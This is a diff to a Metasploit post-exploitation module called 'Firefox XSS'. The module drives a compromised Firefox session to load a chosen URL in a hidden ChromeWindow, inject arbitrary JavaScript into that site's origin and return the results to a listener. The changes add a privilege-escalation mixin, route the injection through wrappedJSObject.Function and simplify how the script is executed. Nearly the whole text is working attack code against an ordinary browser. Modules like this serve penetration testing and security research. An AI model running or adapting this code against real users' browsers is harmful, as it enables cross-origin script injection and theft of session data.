@@ -1,22 +1,24 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 require 'json'
+require 'msf/core/payload/firefox'
 
 class Metasploit3 < Msf::Post
 
   include Msf::Payload::Firefox
+  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation
 
   def initialize(info={})
     super(update_info(info,
       'Name'          => 'Firefox XSS',
       'Description'   => %q{
         This module runs the provided SCRIPT as javascript in the
-        origin of the provided URL. It works by navigating a hidden
-        ChromeWindow to the URL, then injecting the SCRIPT with Function.
+        origin of the provided URL. It works by navigating to a hidden
+        ChromeWindow to the URL, then injecting the SCRIPT with Function().
         The callback "send(result)" is used to send data back to the listener.
       },
       'License'       => MSF_LICENSE,
@@ -35,9 +37,7 @@ class Metasploit3 < Msf::Post
   end
 
   def run
-    session.shell_write("[JAVASCRIPT]#{js_payload}[/JAVASCRIPT]")
-    results = session.shell_read_until_token("[!JAVASCRIPT]", 0, datastore['TIMEOUT'])
-
+    results = js_exec(js_payload)
     if results.present?
       print_good results
     else
@@ -62,14 +62,14 @@ class Metasploit3 < Msf::Post
 
         hiddenWindow[key] = true;
         hiddenWindow.location = "#{datastore['URL']}";
-        
+
         var evt = function() {
           if (hiddenWindow[key]) {
             setTimeout(evt, 200);
           } else {
             setTimeout(function(){
               try {
-                send(hiddenWindow.Function('send', src)(send));
+                send(hiddenWindow.wrappedJSObject.Function('send', src)(send));
               } catch (e) {
                 send("Error: "+e.message);
               }
@@ -78,7 +78,7 @@ class Metasploit3 < Msf::Post
         };
 
         setTimeout(evt, 200);
-      })(send);
+      })(this.send);
 
     |.strip
   end
